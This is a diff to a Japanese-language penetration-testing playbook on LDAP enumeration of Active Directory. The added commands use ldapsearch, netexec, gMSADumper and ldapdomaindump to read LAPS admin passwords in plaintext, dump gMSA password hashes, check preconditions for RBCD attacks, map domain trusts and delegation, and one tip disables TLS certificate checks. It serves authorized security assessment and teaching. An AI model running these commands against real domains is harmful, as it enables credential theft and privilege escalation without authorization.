@@ -18,6 +18,11 @@
 | `memberOf` に `Domain Admins` / `Enterprise Admins` | 高権限ユーザーの特定 | そのユーザーの認証情報取得が最優先目標 |
 | `pwdLastSet=0` | 初回ログイン前 / パスワードリセット直後 | 既定パスワードの可能性 |
 | `adminCount=1` だが `Domain Admins` 外 | 過去に特権を持っていたアカウント（AdminSDHolder） | BloodHound で現在の ACL を確認 |
+| `ms-Mcs-AdmPwd` 属性が読める | **LAPS のローカル管理者パスワード平文が読める** — 委譲権限の付与ミス | 値を取得して該当ホストに `Administrator` で接続 → `../04_Post_Access_Windows_AD/LAPS_Dump.md` |
+| `msDS-GroupMSAMembership` に自分のグループが含まれる | gMSA パスワード読取権限がある | `gMSADumper.py` で `msDS-ManagedPassword` を取得 |
+| `ms-DS-MachineAccountQuota` が 10（既定値）| 任意ユーザーが計算機アカウントを 10 個まで作成可能 | RBCD 攻撃の前提が揃う → `../04_Post_Access_Windows_AD/Delegation_Attacks/RBCD.md` |
+| `(objectClass=trustedDomain)` でエントリが返る | フォレスト / ドメイン信頼が存在 | 信頼先ドメインへの横展開経路の検討（forest-wide DA への昇格経路） |
+| 匿名バインドが通り `objectClass=*` で `Pre-Windows 2000 Compatible Access` メンバの権限相当が見える | 互換性のため `Pre-Windows 2000 Compatible Access` に `Anonymous Logon` 等が含まれている弱化構成 | 匿名で広範な列挙が可能（**finding**） |
 | 匿名バインドで `sizeLimitExceeded` が返る | 匿名でも検索が通っている | 検索範囲・属性を絞って再実行 |
 | 匿名バインドで `operationsError` | 匿名アクセスは拒否されている | 認証情報取得まで後回し |
 
@@ -120,11 +125,78 @@ ldapsearch ... "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=
 ldapsearch ... | grep -i "info\|description\|pass\|pwd\|cred"
 ```
 
+**LAPS パスワードの読み取り（読取権限が委譲されている場合）：**
+```bash
+# 認可ユーザーに LAPS 読取権限が委譲されていれば `ms-Mcs-AdmPwd` が平文で見える
+ldapsearch -x -H ldap://[IP] \
+  -D "[DOMAIN]\[USER]" -w '[PASSWORD]' \
+  -b "DC=[domain],DC=[tld]" -s sub \
+  "(&(objectClass=computer)(ms-Mcs-AdmPwd=*))" \
+  sAMAccountName dNSHostName ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime
+
+# nxc でも同等
+nxc ldap [IP] -u [USER] -p '[PASSWORD]' -M laps
+```
+
+> 取得した平文パスワードでの侵入手順は [`../04_Post_Access_Windows_AD/LAPS_Dump.md`](../04_Post_Access_Windows_AD/LAPS_Dump.md) を参照。**Windows LAPS（v2 / 2023+）では属性名が `msLAPS-Password` 等に変わり、暗号化版もある**ので新環境では両方確認する。
+
+**gMSA パスワード読取権限の確認（gMSADumper の前提）：**
+```bash
+# msDS-GroupMSAMembership に読取権限を持つグループが書かれている。自分のグループ SID が含まれていれば取得可能
+ldapsearch -x -H ldap://[IP] \
+  -D "[DOMAIN]\[USER]" -w '[PASSWORD]' \
+  -b "DC=[domain],DC=[tld]" -s sub \
+  "(objectClass=msDS-GroupManagedServiceAccount)" \
+  sAMAccountName msDS-GroupMSAMembership servicePrincipalName
+
+# 読取可能なら gMSADumper で blob を NTLM ハッシュに変換
+gMSADumper.py -u [USER] -p '[PASSWORD]' -d [DOMAIN] -l [IP]
+```
+
+**MachineAccountQuota の確認（RBCD 攻撃前提）：**
+```bash
+# 既定 10 なら任意ユーザーが 10 個の計算機アカウントを作成可能（RBCD の前提が揃う）
+ldapsearch -x -H ldap://[IP] \
+  -D "[DOMAIN]\[USER]" -w '[PASSWORD]' \
+  -b "DC=[domain],DC=[tld]" -s base \
+  "(objectClass=domainDNS)" ms-DS-MachineAccountQuota
+
+# nxc でも同等
+nxc ldap [IP] -u [USER] -p '[PASSWORD]' -M maq
+```
+
+> `ms-DS-MachineAccountQuota = 0` なら RBCD の機械アカウント作成経路は塞がれている（既存の writable ACE 経由を探す方向）。
+
+**ドメイン信頼（Trust）の列挙：**
+```bash
+# フォレスト / ドメイン信頼の有無・方向・タイプを確認
+ldapsearch -x -H ldap://[IP] \
+  -D "[DOMAIN]\[USER]" -w '[PASSWORD]' \
+  -b "DC=[domain],DC=[tld]" -s sub \
+  "(objectClass=trustedDomain)" \
+  flatName trustPartner trustDirection trustType trustAttributes
+
+# trustDirection の値: 1=Inbound / 2=Outbound / 3=Bidirectional
+# trustAttributes に 0x40 (FOREST_TRANSITIVE) があれば forest trust
+```
+
 **NetExec を使った高速列挙：**
 ```bash
 netexec ldap [IP] -u [USER] -p '[PASSWORD]' --users
 netexec ldap [IP] -u [USER] -p '[PASSWORD]' --kerberoasting kerberoast.out
 netexec ldap [IP] -u [USER] -p '[PASSWORD]' --asreproast asrep.out
+netexec ldap [IP] -u [USER] -p '[PASSWORD]' --trusted-for-delegation     # Unconstrained / Constrained 検出
+netexec ldap [IP] -u [USER] -p '[PASSWORD]' --password-not-required      # PASSWD_NOTREQD ユーザー検出
+```
+
+**ldapdomaindump（BloodHound 前の全体把握ツール・HTML/JSON 一括ダンプ）：**
+```bash
+# 認証情報があればドメイン全体の users / groups / computers / trusts / policy を HTML + JSON で吐く
+mkdir ldd_out && cd ldd_out
+ldapdomaindump -u '[DOMAIN]\[USER]' -p '[PASSWORD]' ldap://[IP]
+
+# ブラウザで domain_users.html / domain_computers.html / domain_trusts.html を確認
+# BloodHound を回す前にこれで概観を掴むと、何を狙うかの当たりが付きやすい
 ```
 
 ---
@@ -139,6 +211,7 @@ netexec ldap [IP] -u [USER] -p '[PASSWORD]' --asreproast asrep.out
 | 大量結果が `sizeLimitExceeded` で途中で切れる | デフォルト 1000 件上限 | `-E pr=500/noprompt` でページング、または `-l unlimited` を試す（サーバー側設定次第） |
 | `info` / `description` フィールドに何も書かれていない | 運用上メモ機能を使っていない組織 | `extensionAttribute1`〜`extensionAttribute15` 等のカスタム属性を確認、または属性指定なしで全属性取得して網羅 |
 | LDAPS（636）に接続できない | 証明書の Subject / SAN とアクセス先（IP）が不一致 | `/etc/hosts` にホスト名を登録してから `ldaps://[FQDN]` で再接続（`../06_Concepts/Hosts_File_For_AD.md` 参照） |
+| LDAPS で `TLS: peer cert untrusted` / `Hostname verification failed` | AD の LDAPS は社内 CA / オレオレ証明書が大半 | 環境変数で証明書検証を無効化: `LDAPTLS_REQCERT=never ldapsearch -H ldaps://[IP] ...`（クライアント側の `/etc/ldap/ldap.conf` に `TLS_REQCERT never` でも可。**finding 化用に正規証明書ならどう失敗するかを併記する**）|
 | `ldapsearch` が `Can't contact LDAP server` | 389 / 636 が閉じている / FW でブロック | nmap で再確認、別 DC（複数ある場合）の IP を試す |
 
 ---
@@ -151,6 +224,7 @@ netexec ldap [IP] -u [USER] -p '[PASSWORD]' --asreproast asrep.out
 - 匿名バインドが通っても `objectClass=user` で中身が返らない環境がある。その場合は `(objectClass=*)` や `domain` レベルで再度試す
 - DN の `DC=` 部分を間違えると結果が空になるだけでエラーは返らない。必ず `namingcontexts` で正しい DN を先に確認する
 - ldap:// と ldaps:// で結果が変わることはほぼないが、認証情報送信の安全性のため資格情報を送る際は ldaps:// を優先
+- **`Pre-Windows 2000 Compatible Access` グループ** は旧 NT 互換用の特殊グループで、ここに `Anonymous Logon` / `Authenticated Users` 等が含まれている古い AD では、**匿名 / 弱認証でも広範な列挙が可能**になる。新規ドメインでは含まれていないことが多いが、長年運用されている AD では残存している場合がある。`memberOf` 検索で `CN=Pre-Windows 2000 Compatible Access` のメンバを確認
 
 ---
 
@@ -162,5 +236,8 @@ netexec ldap [IP] -u [USER] -p '[PASSWORD]' --asreproast asrep.out
 - 後：ユーザー一覧が取得できた → パスワードスプレー `../05_Tools_Reference/Netexec.md`
 - 後：SPN 付きユーザーを発見 → `../04_Post_Access_Windows_AD/Kerberos_Attacks/Kerberoasting.md`
 - 後：AS-REP Roast 可能ユーザーを発見 → `../04_Post_Access_Windows_AD/Kerberos_Attacks/ASREPRoasting.md`
+- 後：`ms-Mcs-AdmPwd` が読めた → `../04_Post_Access_Windows_AD/LAPS_Dump.md`
+- 後：`ms-DS-MachineAccountQuota` が 0 でない + 任意ユーザー権限 → `../04_Post_Access_Windows_AD/Delegation_Attacks/RBCD.md`
+- 後：`TRUSTED_FOR_DELEGATION` / `TRUSTED_TO_AUTH_FOR_DELEGATION` を発見 → `../04_Post_Access_Windows_AD/Delegation_Attacks/Unconstrained.md` / `../04_Post_Access_Windows_AD/Delegation_Attacks/RBCD.md`
 - 後：全体の権限マッピング → `../05_Tools_Reference/BloodHound.md`
 - 後：`info` フィールドにパスワード → `../02_Initial_Access/Credential_Discovery.md`
